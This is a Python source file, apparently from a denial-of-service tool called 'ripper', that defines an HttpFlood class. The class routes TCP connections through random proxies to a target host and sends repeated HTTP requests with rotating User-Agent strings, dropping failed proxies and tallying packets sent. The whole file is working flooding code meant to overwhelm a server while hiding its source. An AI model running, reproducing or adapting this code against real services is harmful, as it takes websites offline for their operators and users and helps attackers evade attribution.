import random
import re
import threading
from contextlib import suppress
from socket import socket
from typing import Any, Tuple

from socks import ProxyError

from ripper.context import Context, Errors


class HttpFlood:
    _http_method: str
    _target: Tuple[str, int]
    _ctx: Context
    _proxy: Any = None

    def __init__(self, target: Tuple[str, int], context: Context):
        self._target = target
        self._ctx = context
        self._http_method = context.http_method

    def create_connection(self):
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as http_connect:
            http_connect.connect(self._target)
            self._ctx.Statistic.connect.status_success()
            while self.send(http_connect):
                # http_response = repr(http_connect.recv(1024))
                continue

            self._ctx.Statistic.connect.status_failed()
            self._ctx.sock_manager.close_socket()

    def send(self, sock: socket) -> bool:
        payload = self.payload().encode('utf-8')
        try:
            sent = sock.send(payload)
        except ProxyError:
            self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
        except Exception as e:
            self._ctx.add_error(Errors('HTTP send Err', e))
        else:
            self._ctx.Statistic.packets.status_sent(sent)
            self._proxy.report_success() if self._proxy is not None else 0

            # http_response = repr(sock.recv(64, 0x40))
            # status = int(re.search(r" (\d+) ", http_response)[1])
            # self._ctx.Statistic.http_stats[status] += 1
            return True

        return False

    def headers(self, content: str = '') -> dict[str, str]:
        """Prepare headers."""
        headers = self._ctx.headers
        headers['Content-Length'] = str(len(content))
        headers['User-Agent'] = random.choice(self._ctx.user_agents)

        return headers

    def payload(self, body: str = '') -> str:
        """Generate payload for Request."""
        body_content = f'{body}\n' if body else ''
        headers = '\n'.join([f'{key}: {value}' for (key, value) in self.headers(body).items()])

        request = '{} {} HTTP/1.1\nHost: {}\n{}\n{}'.format(
            self._http_method.upper(),
            self._ctx.http_path,
            self._ctx.host,
            headers,
            body_content
        )

        return request
